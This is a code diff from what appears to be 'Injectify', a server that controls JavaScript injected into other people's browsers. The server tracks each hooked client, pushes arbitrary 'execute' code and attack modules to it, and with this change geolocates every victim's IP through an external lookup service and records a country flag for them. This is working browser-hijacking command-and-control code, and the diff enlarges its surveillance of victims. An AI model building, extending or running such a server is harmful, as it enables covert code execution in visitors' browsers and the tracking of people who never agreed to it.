@@ -13,6 +13,8 @@ const request = require('request')
 const {URL} = require('url')
 const chalk = require('chalk')
 const fs = require('fs')
+const {flag, code, name} = require('country-emoji')
+const twemoji = require('twemoji')
 const atob = require('atob')
 const btoa = require('btoa')
 const beautify = require('js-beautify').js_beautify
@@ -1054,85 +1056,114 @@ MongoClient.connect(config.mongodb, function (err, db) {
       }
       // Create an array with the project's document ID (could use project name instead of ID)
       if (!inject.clients[project.id]) inject.clients[project.id] = []
-      inject.clients[project.id].push({
-        id: data.id,
-        browser: {
-          'user-agent': parseAgent(socket.headers['user-agent'])
-        },
-        socket: {
-          address: socket.address,
-          headers: socket.headers,
-          id: socket.id,
-          pathname: socket.pathname,
-          prefix: socket.prefix,
-          protocol: socket.protocol,
-          remoteAddress: socket.remoteAddress,
-          remotePort: socket.remotePort,
-          url: socket.url
-        }
-      })
-      if (debug) {
-        send('core', inject.debugCore)
-      } else {
-        send('core', inject.core)
+      let inDebug = false
+      let ip
+      if (socket.url.charAt(19) == "$") inDebug = true
+      try {
+        ip = socket.headers['x-forwarded-for'].split(',')[0]
+      } catch (e) {
+        ip = getIP(socket.remoteAddress)
       }
-      send('execute', 'injectify.send("d")')
-
-      socket.on('data', rawData => {
-        try { rawData = JSON.parse(rawData); if (!rawData.t && !rawData.d) return } catch (e) { return }
-        let on = (topic, callback) => {
-          if (topic !== rawData.t) return
-          callback(rawData.d)
+      request({
+        url: 'http://ip-api.com/json/' + ip,
+        method: 'GET',
+        headers: {
+          'Accept': 'application/json'
         }
+      }, (error, response, parsedIP) => {
+        if (error) throw error
+        try {
+          ip = JSON.parse(parsedIP)
+        } catch (e) {
 
-        on('e', data => { // error
-          send('error', data)
-          console.log(data)
-        })
-
-        on('execute', data => { // execute
-          send('execute', data)
-        })
-
-        on('module', data => { // load a module
-          if (!data.name) return
-          var js = inject.modules[data.name]
-          if (debug) js = inject.debugModules[data.name]
-          if (js) {
-            try {
-              if (data.params) js = 'var module={name:' + JSON.stringify(data.name) + ',params:' + JSON.stringify(data.params) + '};' + js
-              send('module:' + data.name, js)
-            } catch (error) {
-              send('module:' + data.name, false)
-            }
-          } else {
-            send('module:' + data.name, false)
+        }
+        let country = 'https://twemoji.maxcdn.com/2/svg/2753.svg'
+        if (ip.country) country = 'https://twemoji.maxcdn.com/2/svg/' + twemoji.convert.toCodePoint(flag(ip.country)) + '.svg'
+        inject.clients[project.id].push({
+          id: data.id,
+          debug: inDebug,
+          browser: {
+            'user-agent': parseAgent(socket.headers['user-agent'])
+          },
+          ip: ip,
+          images: {
+            country: country
+          },
+          socket: {
+            headers: socket.headers,
+            id: socket.id,
+            remoteAddress: socket.remoteAddress,
+            remotePort: socket.remotePort,
+            url: socket.url
           }
         })
-
-        on('r', data => { // response
-          console.log(data)
+        if (debug) {
+          send('core', inject.debugCore)
+        } else {
+          send('core', inject.core)
+        }
+        send('execute', 'injectify.send("d")')
+  
+        socket.on('data', rawData => {
+          try { rawData = JSON.parse(rawData); if (!rawData.t && !rawData.d) return } catch (e) { return }
+          let on = (topic, callback) => {
+            if (topic !== rawData.t) return
+            callback(rawData.d)
+          }
+  
+          on('e', data => { // error
+            send('error', data)
+            console.log(data)
+          })
+  
+          on('execute', data => { // execute
+            send('execute', data)
+          })
+  
+          on('ping', data => { // execute
+            send('pong')
+          })
+  
+          on('module', data => { // load a module
+            if (!data.name) return
+            var js = inject.modules[data.name]
+            if (debug) js = inject.debugModules[data.name]
+            if (js) {
+              try {
+                if (data.params) js = 'var module={name:' + JSON.stringify(data.name) + ',params:' + JSON.stringify(data.params) + '};' + js
+                send('module:' + data.name, js)
+              } catch (error) {
+                send('module:' + data.name, false)
+              }
+            } else {
+              send('module:' + data.name, false)
+            }
+          })
+  
+          on('r', data => { // response
+            console.log(data)
+          })
+  
+          on('ping', data => {
+            let difference = +new Date() - data
+            send('pong', difference)
+          })
+  
+          on('d', data => { // data
+            send('execute',
+              `/*injectify.listen('message', data => {
+                console.error(data)
+              })*/
+  
+              injectify.send('message', {
+                test: true
+              })
+              `)
+          })
         })
-
-        on('ping', data => {
-          let difference = +new Date() - data
-          send('pong', difference)
+        socket.on('close', function () {
+          inject.clients[project.id] = inject.clients[project.id].filter(client => client.id !== data.id)
         })
-
-        on('d', data => { // data
-          send('execute',
-            `/*injectify.listen('message', data => {
-              console.error(data)
-            })*/
-
-            injectify.send('message', {
-              test: true
-            })
-            `)
-        })
-      })
-      socket.on('close', function () {
-        inject.clients[project.id] = inject.clients[project.id].filter(client => client.id !== data.id)
       })
     }).catch(error => {
       if (config.debug) {
